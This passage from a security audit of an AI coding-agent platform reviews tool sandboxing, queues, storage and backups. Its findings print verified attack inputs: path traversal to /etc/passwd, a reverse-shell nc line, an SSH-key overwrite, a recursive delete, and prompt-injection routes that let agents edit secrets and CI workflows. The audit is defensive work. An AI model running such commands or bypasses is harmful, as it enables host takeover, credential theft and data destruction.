8. **Worktree lifecycle cleanup is real and wired to multiple exit paths** — not just defined-but-uncalled. Stale/crashed worktrees are detected rather than trusted blindly on restart.

#### Confirmed Weaknesses — CRITICAL (all verified by execution against real code)

**1. `read_file`/`read_files`/`file_exists`/`file_info` have zero path-containment check: universal arbitrary host file read — Severity: CRITICAL**
- Root cause: `make_read_only_handlers()` — the base tool set mixed into nearly every agent (research, reviewer, QA, security_reviewer, docs, coder, chat, migration, schema, cleanup, ai_engineer, devops) — builds `p = base / rel` directly and **never calls `check_path()` or `check_path_in_worktree()`**.
- **Verified (executed):**
  ```
  read_file({"path": "../"*10 + "etc/passwd"})   -> full /etc/passwd contents
  read_file({"path": "/etc/passwd"})              -> full /etc/passwd contents
  ```
  Both succeeded with no denial.
- Files: `backend/app/agents/tools.py:1098-1138` (read_file), `:1258-1271` (read_files), `:1273-1301` (file_exists/file_info), `:1203-1240` (get_file_tree, directory-listing variant).
- Proposed fix: Route every path argument through `check_path_in_worktree(rel, repo_path)` before touching the filesystem.

**2. Doc-writing agents bypass worktree containment AND the `.github/workflows/` protection CLAUDE.md claims is "enforced in policy engine Python code" — Severity: CRITICAL**
- Root cause: `dg_write_file` (doc_generator family), `rm_write_file` (README agent), `ad_write_file` (API docs agent) implement ad-hoc suffix checks instead of calling `check_path_in_worktree`. `rm_write_file`/`ad_write_file` call **no policy function at all.**
- **Verified (executed, real writes landed on disk):**
  ```python
  # doc_generator agent, "docs/" prefix but traversing out:
  write_file({"path": "docs/" + "../"*10 + "/tmp/xxx/pwned_via_docs_prefix.txt", ...})
  -> file created OUTSIDE the worktree

  # README agent, CLAUDE.md-protected path:
  write_file({"path": "docs/../.github/workflows/evil.yml", "content": "malicious workflow"})
  -> file WRITTEN INSIDE .github/workflows/
  ```
  A correct sibling implementation (`make_docs_handlers.write_file`) exists in the same file and does block this — proving the fix pattern already exists and simply wasn't applied consistently.
- Files: `backend/app/agents/tools.py:1937-1950,5016-5025,5103-5112` (vulnerable); `:1970-1989` (correct reference implementation).
- Proposed fix: Replace ad-hoc checks with `check_path_in_worktree()`, matching the correct sibling.

**3. Allowlist chaining check omits newline and redirection — Severity: CRITICAL**
- Root cause: `_CHAINING_METACHARS` (`policy/engine.py:207`) blocks `;`/`&&`/`||`/backticks/`$(` but **not** `\n`, `>`, `<`. This is the sole gate for ~12 non-sandboxed bash handlers (devops, QA, test-runner, dependency-audit, etc.) that run directly on the **host** via `subprocess.run(shell=True)`.
- **Verified (executed):**
  ```python
  check_allowlisted_command('echo pwned > /home/victim/.ssh/authorized_keys', devops_prefixes)
  -> PolicyResult(allowed=True)

  check_allowlisted_command('git status\nnc -e /bin/sh 10.0.0.1 4444', devops_prefixes)
  -> PolicyResult(allowed=True)
  ```
  A separate, stricter helper elsewhere in the same file (`_shell_metachar_reason`) already blocks these characters for other purposes — just was never applied to the central allowlist gate.
- Files: `backend/app/policy/engine.py:207,250-270`.
- Proposed fix: Add `\n`, `\r`, `>`, `<` to `_CHAINING_METACHARS`.

**4. Cleanup Agent's allowlisted `find` reproduces exactly the host-destruction case the sandbox was built to prevent — Severity: CRITICAL**
- Root cause: `_CLEANUP_BASH_ALLOWLIST` includes bare `"find "` as an allowed prefix, executed unsandboxed. `sandbox.py`'s own docstring explicitly cites `find /workspace -mindepth 1 -delete` as the proof case motivating Docker sandboxing — yet this handler was excluded from that rollout.
- **Verified:** `check_allowlisted_command("find / -mindepth 1 -delete", CLEANUP_ALLOWLIST)` → `allowed=True`.
- Files: `backend/app/agents/tools.py:6645-6655,6726-6742`.
- Proposed fix: Remove bare `find` from the allowlist, or route through the sandbox.

**5. AI Engineer agent's `run_python_snippet` has no policy check at all; broader allowlist is effectively unrestricted code execution — Severity: CRITICAL**
- Root cause: `ae_run_python_snippet` calls `subprocess.run(["python", "-c", code], ...)` directly — `code` never passes through any policy function. `_AI_BASH_ALLOWLIST` separately includes `python`, `python3`, `pip install` as prefixes — inherently unrestrictable (any program/package satisfies the prefix; `pip install` is a supply-chain RCE vector via install-time hooks).
- **Verified:**
  ```python
  check_allowlisted_command('python /tmp/reverse_shell.py', AI_ALLOWLIST)  -> allowed=True
  check_allowlisted_command('pip install some-malicious-pkg', AI_ALLOWLIST) -> allowed=True
  # ae_run_python_snippet: no check_command call exists at all
  ```
- Files: `backend/app/agents/tools.py:6568-6580,6554-6566,6582-6598`.
- Proposed fix: Needs real sandboxing (same category as the 3 already-covered tools). Drop `pip install`/bare `python` from any prefix-matched allowlist.

#### Confirmed Weaknesses — High/Medium/Low

**6. `fetch_url` (AI Engineer + others) is SSRF-capable with no allowlist, and outside the prompt-injection wrapping — Severity: High**
- Root cause: `urllib.request.urlopen(url)` on a fully agent-controlled URL, no host/scheme allowlist, no internal/link-local range check. Also not in `_UNTRUSTED_CONTENT_TOOLS` — a fetched page's raw content goes straight into the next LLM call completely unmarked.
- Files: `backend/app/agents/tools.py:6613-6622` (and two other `fetch_url` handlers at `:8717,:9546`, not individually audited), `base_graph.py:1308`.
- Proposed fix: Add a host allowlist/denylist (block RFC1918, link-local, `169.254.169.254`, etc.); add `fetch_url` to `_UNTRUSTED_CONTENT_TOOLS`.

**7. `git_service._validate_workspace` has a classic prefix-without-separator bypass — Severity: Medium**
- Root cause: `real.startswith(os.path.realpath(parent))` with no `os.sep` boundary check (unlike the correctly-written sibling in `policy/engine.py`).
- **Verified:** `"/home2/evil".startswith("/home")` → `True` (should be `False`); same for `/homework/evil`, `/homeuser-evil/project`.
- Files: `backend/app/services/git_service.py:46-58`.
- Proposed fix: `real == real_parent or real.startswith(real_parent + os.sep)`.

**8. Policy allow/deny decisions are not captured in the structured audit log — Severity: Medium**
- Root cause: The well-designed `AuditLog` mechanism exists but is called from almost nowhere in the actual policy-check path — grepped for exactly one call site (a *read* tool, not a write to the log). The main tool loop's policy denial only does `logger.warning()` — a transient log line, not a structured queryable audit entry.
- Risk: "The authoritative timeline for incident review" (the module's own docstring) cannot actually answer "what did agent X attempt and get blocked on."
- Files: `backend/app/fleet/audit_log.py`, `backend/app/agents/base_graph.py:1579-1589`.
- Proposed fix: Call `audit()` at the single choke point in `base_graph.py` where a policy denial is already detected.

**9. No secret-content scanner before commit; only filename-pattern denylist — Severity: Low/Medium**
- Root cause: `git_commit_change` validates each file path via `check_path()` (a filename denylist) but never inspects file *contents*. A masking helper exists but is only used for display, not as a pre-commit scanner.
- Files: `backend/app/agents/tools.py:12546-12593,7642-7672`.

**10. No application-level lock around `create_worktree` — Severity: Low**
- Root cause: No `FileLock`/`asyncio.Lock` around `git worktree add`/`remove` against the shared base repo; relies entirely on git's own internal locking.
- Files: `backend/app/repo_tools/worktree.py`.

**11. Rejecting a `git_push` approval leaves the worktree in place — Severity: Low**
- Root cause: `dispatch_git_push_decision`'s reject branch only sets `pr_status="failed"` — doesn't call `remove_worktree` (a different reject path, `POST /{task_id}/reject`, does clean up correctly).
- Files: `backend/app/api/approvals.py:93-112`.

**Also flagged in Phase P+Q+R+S+T (same root-cause category, listed here for completeness):**
- **`apply_patch` bypasses the entire path denylist** (see Section 4.8, finding #1) — the universal policy gate reads `tool_input.get("path", "")`, but `apply_patch`'s schema has no `path` field (paths are embedded in the diff text), so the check always silently passes.

**Summary — findings #1–#5 are the priority: independently exploitable, require no chaining. Together with the `apply_patch` bypass, most of the fleet's non-coder agents can either read arbitrary host files, write outside their worktree (bypassing the explicit CLAUDE.md `.github/workflows/` rule), or execute unsandboxed host commands well beyond their stated role — despite the per-agent tool *scoping* itself being real and generally well-architected.**

---

### 4.6 Phase J+K+L — Mission Control + Event Bus + Artifact Storage

**Scope:** `apps/web/` (dashboard), `backend/app/event_bus/`, `backend/app/artifacts/`.

#### PHASE J — Mission Control: Verified Strengths

1. **Real-time updates are genuinely real, not polling-disguised-as-live** — three independent SSE channels genuinely wired end-to-end (task activity stream with bounded history replay, fleet requests stream, chat token streaming via real `fetch().body.getReader()`).
2. **SSE reconnection is production-grade** — bounded exponential backoff (5 attempts, 1s→30s cap), correctly distinguishes terminal agent-reported errors from transient connection drops.
3. **Diff viewer is XSS-safe** — renders as JSX text children (React auto-escapes); zero `dangerouslySetInnerHTML` anywhere in `apps/web`.
4. **Approval UI gating is correctly two-layered** — client-side hiding is explicitly documented as cosmetic-only; server-side `require_approver` + status re-validation is the real enforcement, confirmed present.
5. **`isApprover()`/role model is sound** — only a role hint sits in localStorage; the real session is an HttpOnly cookie, so a tampered localStorage role can't bypass server enforcement.

#### PHASE J — Confirmed Weaknesses

**1. Task log viewer has no pagination or virtualization, and the backend query is unbounded — Severity: Medium**
- Root cause: `list_logs()` runs with **no LIMIT**, returning every log row for a task's entire lifetime; frontend fetches the whole array on a 3-second `refetchInterval` and renders it with no windowing.
- Risk: A long-running/looping agent task with thousands of log rows re-transfers the full growing array every 3 seconds and forces React to mount thousands of DOM nodes — can freeze the tab. The activity feed has the same unbounded pattern.
- Files: `backend/app/db/repository.py:346-353`, `apps/web/app/tasks/[id]/page.tsx:28-31,425-427`, `apps/web/app/stream/[taskId]/page.tsx:219-251`.
- Proposed fix: Add LIMIT/keyset pagination + a paged API + virtualized list; cap terminal output beyond a byte threshold.

**2. No task replay feature exists — Severity: Low.**
**3. No full-text search anywhere in the dashboard — only client-side filter chips on already-loaded pages — Severity: Low.**

#### PHASE K — Event Bus: Verified Strengths

1. **Postgres bus + Redis Streams fan-out genuinely coexist without blocking each other** — the disabled flag is correctly checked inside the Redis module itself, no call-site duplication.
2. **Retries are actually enforced** for the failure mode they cover — real exponential backoff, exhaustion writes to a real `failed_events` table (confirmed via migration and passing tests).
3. **Replay-on-restart primitive exists and is correct** — `get_unprocessed_events()` is a real, usable replay path.
4. **SSE backpressure is well-handled** — bounded per-subscriber queue, drop-on-full with a warning rather than blocking the publisher.

#### PHASE K — Confirmed Weaknesses

**1. `subscribe()`/`unsubscribe()` are dead code — zero in-process handlers ever registered in production — Severity: High**
- Root cause: `bus.subscribe()` is defined and re-exported, but grep confirms **zero production call sites** — only ever invoked from a unit test. This means the entire handler-dispatch/retry/`failed_events` machinery inside `publish_event()` is exercised only in tests, never against a real handler at runtime.
- Risk: All real orchestration happens via direct sequential function calls in `manager.py`; `publish_event()` calls are audit-logging/observability only, not the mechanism driving pipeline progression — contrary to what an event-bus architecture implies. If a future engineer adds a real subscriber assuming retry/dead-letter already protects it, they'd be trusting genuinely-tested code, so risk is mostly "architectural surprise" today.
- Files: `backend/app/event_bus/bus.py:42-49,185-191`.
- Proposed fix: Either wire real subscribers, or update the docstring to state plainly that the bus today is an audit/persistence + fan-out log, not a live dispatch mechanism.

**2. Redis Streams is write-only — no consumer anywhere ever reads/acks the stream — Severity: High**
- Root cause: `read_pending()`/`acknowledge()` are never called anywhere outside their own definitions. No `XCLAIM`/`XAUTOCLAIM` logic exists, so a crash after `xreadgroup` but before `xack` leaves a message permanently stuck in the Pending Entries List — no recovery path.
- Risk: When `redis_streams_enabled=True`, events accumulate and are silently trimmed at 10k with nothing ever draining/acking them from within this codebase. Direct answer to "recovery after a crash": for the Redis path, in-flight/unacked messages **are** effectively lost/stuck today.
- Files: `backend/app/event_bus/redis_streams.py:104-155`.

**3. No idempotency key / duplicate-event detection — Severity: Medium**
- Root cause: `event_id` defaults to a fresh `uuid4()` per construction; a retried publish mints a new ID, so there's no content-based dedup.
- Risk: Direct answer to the idempotency question — the bus provides no protection today; safety depends entirely on there being no in-process subscribers (Weakness #1). If subscribers are ever wired up, this becomes immediately live.
- Files: `backend/app/event_bus/models.py:20-31`, `bus.py:160-191`.

**4. Ordering is a byproduct of caller discipline, not a bus guarantee — Severity: Low-Medium**
- Root cause: The docstring claims per-task ordering, but this is true only because one caller happens to `await` sequentially — the bus itself has no per-task lock or sequence counter, only wall-clock `created_at`.
- Files: `backend/app/event_bus/bus.py:1-14,167,194-234`.

**5. `events`/`failed_events` tables excluded from retention/archival — grow unbounded forever — Severity: Low**
- Files: `backend/app/services/retention.py:33-37`.

#### PHASE L — Artifact Storage: Verified Strengths

1. **Both `db` and `s3` backends are wired and functionally reachable**, with a real, documented fix for retrieval-side inconsistency (looks up the storage path actually used at save time, not the current config).
2. **S3 path is compressed and includes metadata for traceability.**
3. **S3 config validation is fail-fast** — errors at startup if misconfigured.
4. **`list_artifacts()` correctly orders newest-first.**

#### PHASE L — Confirmed Weaknesses

**1. `artifact_backend="db"` (the default) does NOT actually store content in Postgres — it's local disk with only a path in the DB — Severity: High**
- Root cause: The disk adapter always writes to local disk; the DB only ever stores a `storage_path` string. `config.py`'s own field description says `'db' (PostgreSQL)`, actively implying content lives in Postgres when it doesn't.
- Risk: In any horizontally-scaled or ephemeral-container deployment, artifacts written by one instance become unreadable from any other instance or after a redeploy — a silent data-loss/availability failure the naming actively obscures. Not live today (single-instance dev-only compose), but a real trap.
- Files: `backend/app/artifacts/store.py:1-10,58-99`, `config.py:458-460`.
- Proposed fix: Rename to accurately reflect "local disk with DB-tracked metadata," or actually store bytes in Postgres for a true "db" backend.

**2. The local-disk (default) artifact path performs synchronous blocking I/O inside an async function — Severity: Medium**
- Root cause: The non-S3 branch of `save_artifact_async()` calls a plain sync disk-write function with **no** `asyncio.to_thread` wrapping — unlike the S3 branch, which explicitly wraps its blocking boto3 call for exactly this reason.
- Risk: Every artifact save under the default backend (including full unified diffs) blocks the event loop for the write's duration.
- Files: `backend/app/artifacts/store.py:58-99,141-142`.

**3. No compression on the default (disk) backend — only S3 compresses — Severity: Medium.**

**4. No checksum/integrity verification on artifacts in either backend — Severity: Medium**
- Risk: Silent disk corruption or a corrupted S3 object would be returned to a caller (e.g., a diff rendered in Mission Control, or test results fed into a QA gate) with no detection.
- Files: `backend/app/artifacts/store.py`, `s3_store.py`.

**5. The `version` field is dead/meaningless — always hardcoded to `1`, "versioning" doesn't actually happen — Severity: Low**
- Root cause: Both save paths hardcode `version=1` unconditionally; repeated writes of the same artifact type for a task create independent sibling rows, both claiming version 1.
- Files: `backend/app/artifacts/store.py:84-99,132-142`.

**6. Retention archives DB metadata rows but never touches the underlying artifact bytes — disk/S3 storage grows unbounded regardless of retention config — Severity: Low**
- Root cause: `_archive_table()` only flips a DB flag — self-acknowledged as an intentional interim state in the module's own docstring.
- Files: `backend/app/services/retention.py:1-15,40-73`.

---

### 4.7 Phase M+N+O — Observability + Database + Queue System

**Scope:** `backend/app/main.py`, `backend/app/fleet/metrics.py`, `backend/app/api/metrics.py`, `backend/app/db/`, `backend/migrations/`, `backend/app/queue/`, `backend/app/pipeline/queue_adapter.py`.

#### PHASE M — Observability: Verified Strengths

1. **Real OTEL bridge, not just initialized-and-ignored** — genuine child spans per agent run and per tool call, genuinely wired into `base_graph.py`, not dead scaffolding.
2. **Cost/usage metrics API exists and is real** — real aggregate SQL, not mocked.
3. **`MetricsCollector` tracks a genuinely useful set of run-level signals** — including a real confidence-miscalibration cross-check.
4. **Alerting is wired into real code paths**, confirmed called from multiple task-transition sites, not dead config.
5. **Orphan-run recovery exists**, providing a real answer for crash/restart in-flight-work questions.

#### PHASE M — Confirmed Weaknesses

**1. No Prometheus/metrics-scrape endpoint and no Grafana config anywhere in the repo — Severity: Medium**
- The metrics endpoint returns JSON for a UI dashboard, not Prometheus exposition format. Zero hits for "prometheus"/"grafana" anywhere in the repo.
- Files: `backend/app/api/metrics.py`.

**2. Logging is unstructured, plain-text, and NOT trace_id-correlated despite the code's own documented design claim — Severity: Medium**
- Root cause: `logging.basicConfig()` with no format, no JSON, no structlog. Zero logger calls anywhere attach `trace_id` via `extra=`. But `fleet/metrics.py`'s own module docstring explicitly claims "Every run has a trace_id that correlates: bus events, logs, approvals, checkpoints, rollbacks" — false for logs as implemented.
- Risk: An operator grepping logs for a failing run has no trace_id anchor; must cross-reference via the events table or a 1000-entry in-memory ring buffer (lost on restart) instead.
- Files: `backend/app/main.py:415`, `fleet/metrics.py:1-15` (docstring/reality gap), `base_graph.py` (no trace_id in any logger call).

**3. `/health` is a single combined endpoint, not split liveness/readiness — Severity: Low/Medium**
- Risk: In Kubernetes, a transient DB blip fails the same endpoint used for the liveness probe, causing an unnecessary pod restart instead of just removal from load-balancer rotation.
- Files: `backend/app/main.py:625-687`.

**4. No latency/performance tracking on raw API request handling, only on agent runs — Severity: Low.**

#### PHASE N — Database: Verified Strengths

1. **`dev_tasks.status` (the hottest-path query column) IS indexed.**
2. **`memory_embeddings`/`versioned_lessons` vector columns both have real HNSW indexes** — including a documented gap-closure where one was found missing 10 migrations later and fixed.
3. **All 31 migrations have real, non-empty `downgrade()` implementations** — spot-checked, not `pass` stubs.
4. **Retention is archive-not-delete**, matching spec, with the `archived` column itself indexed.
5. **`DevTask.status` has a real, enforced state machine** with documented gap-closures for previously-unreachable transitions.
6. **`dev_tasks.priority` is DB-enforced via a CHECK constraint**, not just app-level.

#### PHASE N — Confirmed Weaknesses

**1. `agent_runs.task_id` — a hot-path FK — has no index anywhere in the schema — Severity: High**
- Root cause: `ForeignKey` with no `index=True`; confirmed absent from all 31 migrations. Postgres does not auto-index FK columns.
- Risk: Every query joining/filtering `agent_runs` by `task_id` (including the metrics dashboard) does a sequential scan as the table grows — unbounded over the project's lifetime.
- Files: `backend/app/db/models.py:174-176`.

**2. No `pool_size`/`max_overflow` configured on the async engine — defaults may be too small — Severity: Medium/High**
- Root cause: `create_async_engine()` with no explicit pool sizing — SQLAlchemy's async default is 5 + 10 overflow = 15 max. `max_concurrent_agent_runs` defaults to **20** — the app's own designed concurrency ceiling already exceeds the default pool before accounting for request handling and additional throwaway engines created elsewhere in the code.
- Risk: Under real concurrent load, risks `QueuePool limit exceeded` failures surfacing as opaque 500s or silently-failed background tasks.
- Files: `backend/app/db/session.py:19-22,32-44`, `config.py:415`.

**3. No row-level locking (`SELECT ... FOR UPDATE`) anywhere — task status transitions are a genuine TOCTOU race — Severity: High**
- (Same root cause as Section 4.1 Weakness #1 — cross-referenced here from the DB angle.) Grep confirms zero uses of `FOR UPDATE`/`SKIP LOCKED` codebase-wide.
- Files: `backend/app/db/repository.py:209-222`, `api/tasks.py:187-230`.

**4. Retention cleanup runs one large unbounded `UPDATE` per table with no batching — Severity: Medium**
- Risk: On a large table with a big backlog, a single statement can touch millions of rows in one transaction, holding write locks for the whole duration — blocking concurrent writes (every agent run's heartbeat/log calls) for that window.
- Files: `backend/app/services/retention.py:40-73`.

**5. `GET /api/metrics/epics` does one extra DB round-trip per epic in a Python loop — genuine N+1 — Severity: Low/Medium**
- Files: `backend/app/api/metrics.py:134-169`.

**6. Same missing-locking pattern generalizes to `heartbeat_agent_run`/`finish_agent_run`** — low real impact but same root cause as #3.

#### PHASE O — Queue System: Verified Strengths

1. **Two real, independently-testable queue backends exist**, not one stub and one real implementation.
2. **The RQ adapter correctly bridges async job functions into RQ's sync-only pickled-call model** — a real, correct design decision.
3. **The gap between queue infrastructure and real usage is self-documented in the code, not hidden.**
4. **Orphan-run recovery provides a real answer** for the currently-real (`BackgroundTasks`) dispatch path.

#### PHASE O — Confirmed Weaknesses

**1. The entire RQ queue/priority/scheduler infrastructure described in `docker-compose.yml` is disconnected from real task dispatch — Severity: Critical**
- Root cause: `docker-compose.yml` runs a real `rq worker` service with real priority queues implemented in `rq_adapter.py`, but **no real task-launch call site uses `queue().enqueue()`** — confirmed via grep. All real dispatch (`run_task`, `restart_task`, pipeline-approve, git-push) uses `BackgroundTasks.add_task()` directly. `QUEUE_BACKEND=rq` has zero effect on real processing regardless of setting.
- Risk: An operator who runs the RQ profile believing they've gained horizontal scalability, job persistence, and priority queueing gets none of that for real task dispatch.
- Files: `backend/app/pipeline/queue_adapter.py:10-27` (self-documented), `api/tasks.py:218,226,290,347,418,444,577`, `docker-compose.yml:97-112`.
- Proposed fix: Either wire real dispatch through `queue().enqueue()` when `QUEUE_BACKEND=rq`, or clearly relabel the RQ compose service/profile as aspirational/unused.

**2. No retry configuration on RQ jobs, and no dead-letter handling code — Severity: High (moot until #1 fixed, but real gap in what exists)**
- Root cause: `enqueue()` never passes `retry=Retry(...)`; grep confirms zero uses of `FailedJobRegistry`/`Retry(` anywhere. A failed job goes into RQ's own registry with **no automatic retry and no application code ever reads it** — effectively a silent drop.
- Files: `backend/app/queue/rq_adapter.py:52-72`.
- Proposed fix: Pass real retry config on enqueue; add a periodic sweep reading `FailedJobRegistry` (mirroring the existing orphan-recovery loop pattern), alerting or writing to the existing `failed_events` mechanism.

**3. `--with-scheduler` is passed to the RQ worker but nothing in the application schedules anything through it — Severity: Medium**
- Dead infrastructure flag; the app's real periodic jobs are all plain `asyncio.sleep()` loops in the main FastAPI process, not RQ-scheduler-driven.
- Files: `docker-compose.yml:101`.

**4. `AsyncioQueueAdapter` (the actual default) has no retry and loses all state on restart — Severity: Medium**
- Consistent with #1 — moot in practice today since this adapter also isn't the real dispatch path, but worth noting if ever promoted.
- Files: `backend/app/pipeline/queue_adapter.py:59-108`.

---

### 4.8 Phase P+Q+R+S+T — Model Router + Scalability + Performance + Disaster Recovery + AI-Specific Security

**Scope:** `backend/app/fleet/model_router.py`, architecture-level scalability reasoning, `backend/app/repo_tools/scanner.py`, DR mechanisms (or their absence), AI-specific security surfaces.

#### Verified Strengths

1. **Model routing is a real, centralized, hot-reloadable table** — `ModelRouter.route()` is the actual source of truth, confirmed to override every agent module's own fallback.
2. **A real, wired-in circuit breaker** — proper closed→open→half-open state machine, genuinely called from all three real LLM call paths (Anthropic worker agents, Anthropic chat streaming, Groq), separate instances per provider.
3. **Real per-provider retry/backoff exists for Groq.**
4. **Streaming mid-stream errors are handled correctly** — catches API errors inside the stream context, records breaker failure, pushes a typed error event, cleanly stops.
5. **Token accounting is real, not estimated** — reads actual `usage.input_tokens`/`output_tokens` from the API response; a real prior bug (flat rate applied regardless of model tier) was found and fixed.
6. **A genuine, deliberate prompt-injection mitigation exists** — untrusted content wrapped in an explicit delimiter, separately flags injection-shaped patterns with a visible warning.
7. **Path-based write protection is real and reasonably thorough** for the tools it covers — resolves symlinks via realpath specifically to prevent symlink-based sandbox escape (though see Section 4.5 for tools that bypass this entirely).
8. **HNSW vector indexes exist.**
9. **S3 artifact I/O is properly offloaded** to a thread.
10. **LangGraph agent-run checkpointing is durable** — real Postgres-backed saver, survives restarts.

#### Confirmed Weaknesses

**1. `apply_patch` silently bypasses the path-denylist that protects `.env`/`secrets/`/`.github/workflows/`/private keys — Severity: Critical**
- Root cause: The universal tool gate checks path safety via `tool_input.get("path", "")`, but `apply_patch`'s actual input schema has **no `path` field** — target paths are embedded inside the unified-diff text. `check_path("")` always returns `allowed=True`.
- Risk: An agent (or content that manipulates an agent via prompt injection) can call `apply_patch` with a diff modifying `.env`, `secrets/`, `.github/workflows/*.yml`, private keys, or `.git/` — completely bypassing the exact protection `write_file`/`edit_file`/`delete_file` correctly enforce for the same paths. Directly contradicts CLAUDE.md's permanent rule.
- Files: `backend/app/agents/base_graph.py:547-559`, `backend/app/agents/tools.py:2519-2534,8535-8568`.
- Proposed fix: Parse target file paths out of the unified-diff header lines (`+++ b/...`) before invoking `patch`, and run each through `check_path()`/`check_path_in_worktree()`, refusing the whole patch if any target is denied.

**2. Agents can freely *read* secrets — only writes are blocked, content isn't redacted downstream — Severity: High**
- Root cause: `check_path()`'s deny rules are only invoked for the 4 write-shaped tools; `read_file`/`read_files` apply no equivalent check (also independently confirmed and exploited in Section 4.5, finding #1). The only secret-masking helper found has exactly one call site, not applied to `read_file`, `git_show`, `git_blame`, `bash` output, or any other content-returning tool.
- Risk: A real API key or credential reachable from the target repo can flow into an agent's LLM context and from there into the agent's final output — a PR description, commit message, or a logged artifact — with no redaction layer.
- Files: `backend/app/agents/base_graph.py:547-559`, `tools.py:1098-1130,7642-7660`.

**2b. `_UNTRUSTED_CONTENT_TOOLS` covers only 3 of the many tools that surface attacker-influenceable content — Severity: Medium**
- Root cause: Only `web_search`, `read_file`, `read_files` get the injection-defense wrapping. `fetch_url`, `http_request`, `git_diff`, `git_log`, `git_show`, `git_blame`, `github_list_prs`/`github_comment` get neither the delimiter nor the injection-pattern flag, despite carrying equally untrusted external content (commit messages, PR bodies, fetched pages are all attacker-influenceable).
- Files: `backend/app/agents/base_graph.py:1308,1341`.

**3. Anthropic (the primary provider) has no explicit rate-limit retry/backoff — Groq (the fallback) does — Severity: Medium**
- Root cause: Anthropic client construction sites pass only `api_key` (and in one place, `timeout`) — no `max_retries` — relying entirely on the SDK's undocumented default, in contrast to the explicit, tuned retry loop built for Groq.
- Files: `backend/app/agents/base_graph.py:120-127`, `chat_agent.py:524`, `agents/base.py:50`, `pipeline/bootstrap.py:102` vs. `groq_adapter.py:279-360`.

**4. Model selection is purely static per-agent-tier — never cost-aware or budget-aware at dispatch time — Severity: Low/Informational**
- Not a bug relative to design intent (CLAUDE.md pins tiers deliberately), but no automatic cost-saving lever exists beyond the binary "block until approved" gate.

**5. No leader election / distributed lock — every backend instance runs every singleton background loop — Severity: High (for horizontal scaling)**
- Root cause: `main.py`'s `lifespan()` unconditionally starts 7 background loops on every process start. Grep for `pg_advisory`/`redlock`/`leader_election` returns nothing.
- Risk: Running 2+ backend instances means all 7 loops run redundantly on every instance — N× duplicate work, some of which (retention deletes, orphan recovery) is likely idempotent by accident, not by design/verification.
- Files: `backend/app/main.py:532-538`.
- Proposed fix: A Postgres advisory lock (`pg_try_advisory_lock`) or Redis lease per loop name, acquired before each cycle's work.

**6. Chat sessions and per-task activity streams are in-process-only — sticky sessions are a hard requirement, not documented as such — Severity: High**
- Root cause: `_sessions: dict[str, ChatSession] = {}` is a plain module-level dict; `send_message`/`confirm_action` do a strict in-memory lookup with no DB fallback. Same pattern for the SSE activity-stream registry.
- Risk: Behind a plain (non-sticky) load balancer, a session created on instance A and messaged on instance B returns a 404 — chat is silently broken under naive horizontal scaling.
- Files: `backend/app/models/chat.py:23-66`, `api/chat.py:61-66,118-150,238-267`, `services/activity_stream.py:151-203`.
- Proposed fix: Enforce sticky sessions at the load balancer (documented as a hard requirement), or move session/stream state into Redis.

**7. `bg_process_registry` and the in-memory fleet-checkpoint `CheckpointStore` are also single-instance-only — Severity: Medium.**

**8. Redis has no persistence configured in docker-compose — RQ queue contents are volatile — Severity: Medium**
- Root cause: The `redis` service has a healthcheck but no named volume, no `--appendonly yes` (unlike the `db` service, which does have a persistent volume).
- Files: `docker-compose.yml:25-34`.

**9. No database backup mechanism exists anywhere in the codebase — Severity: Critical**
- Root cause: Exhaustive search (`pg_dump`/`pg_basebackup`/"backup"/"restore") across `.py`/`.sh`/`.yml`/`.md` found zero implementation. The only appearances of "backup" anywhere are as an unbuilt item in a planning doc.
- Risk: Total, unrecoverable data loss (all tasks, agent runs, memory, chat history, LangGraph checkpoints — everything) on any Postgres volume loss/corruption.
- Proposed fix: At minimum, document and schedule `pg_dump`/WAL archiving (or confirm reliance on a managed provider's automated backups), and write a restore runbook — the single most consequential gap in the whole audit.

**10. Git worktrees and cloned repos live in `/tmp` by default — in-flight and even "ready" repo state is not durable — Severity: High**
- Risk: A host crash/container restart/`/tmp` cleanup job loses every in-flight worktree and cloned repo; DB rows can then reference paths that no longer exist, leaving orphaned state rather than a clean resume.
- Files: `backend/app/config.py:56-62`.

**11. Checkpoint/backup consistency across DB and filesystem was never designed for — Severity: Medium (compounds #9/#10)**
- A future DB-only backup fix, without also fixing worktree durability, would silently produce a resumed graph operating on a stale or missing working tree.

**12. Repo indexing runs synchronously inline in async request handlers, blocking the event loop — Severity: Medium**
- (Cross-referenced from Section 4.2, confirmed independently by this pass too.) `index_repository()` is a plain `def`, never wrapped in `asyncio.to_thread`, called directly from multiple async endpoints.
- Files: `backend/app/repo_tools/scanner.py:215`, `api/repo.py:356-362,421-506`.

**13. Unscoped ("legacy"/global) memory rows are visible across every repo by design — a real, documented cross-repo leak channel — Severity: Medium**
- Root cause: The memory store's own docstring states unscoped rows surface as fallback knowledge in *every* repo. No `user_id`/tenant concept exists anywhere in the schema — `Repo` has no owner column.
- Risk: Architecturally single-tenant; if ever exposed to genuinely separate customers/orgs, zero repo-level access control exists at the data layer.
- Files: `backend/app/memory/store.py:12-31`, `db/models.py:476-495`.

**14. No explicit DB connection pool sizing for multi-instance/multi-worker deployment — Severity: Low** (same as Section 4.7 finding, cross-referenced).

**Scope boundaries noted by this pass:** Redis clustering/read replicas are genuinely not implemented (not misconfigured — presented as absent). RQ workers themselves (unlike the in-process asyncio loops) are safe to run as N replicas since Redis's atomic queue ops handle that correctly — the problem is nothing feeds them real work (see Section 4.7). No documented/scripted deployment rollback procedure was found anywhere.

---

## 5. Consolidated Release Blockers

These must close before any production deployment against untrusted or adversarial repo/task content:

| # | Blocker | Severity | Section |
|---|---|---|---|
| 1 | `apply_patch` bypasses the entire path denylist (`.env`/`secrets/`/`.github/workflows/`/keys) | Critical | 4.5, 4.8 |
| 2 | `read_file`/`read_files`/`file_exists`/`file_info` — zero path containment, verified arbitrary host file read | Critical | 4.5 |
| 3 | Doc-writing agents bypass worktree containment and write directly into `.github/workflows/` | Critical | 4.5 |
| 4 | Command-chaining allowlist gate omits newline/redirect — used by ~12 unsandboxed host-executing handlers | Critical | 4.5 |
| 5 | Cleanup Agent's `find` allowlist entry, unsandboxed — reproduces the exact case Docker sandboxing was built to prevent | Critical | 4.5 |
| 6 | AI Engineer's `run_python_snippet` — no policy check at all; `pip install`/`python` in a prefix allowlist | Critical | 4.5 |
| 7 | No database backup mechanism exists anywhere in the codebase | Critical | 4.8 |
| 8 | RQ/priority-queue infrastructure in `docker-compose.yml` is entirely disconnected from real task dispatch | Critical | 4.7 |

## 6. Remaining Technical Debt

- The tool/policy layer needs a consistency pass — the correct fix pattern already exists in this codebase (`make_docs_handlers.write_file`, `check_path_in_worktree`) and simply wasn't applied to every sibling handler. Highest-leverage fix: one correct pattern, many missing applications.
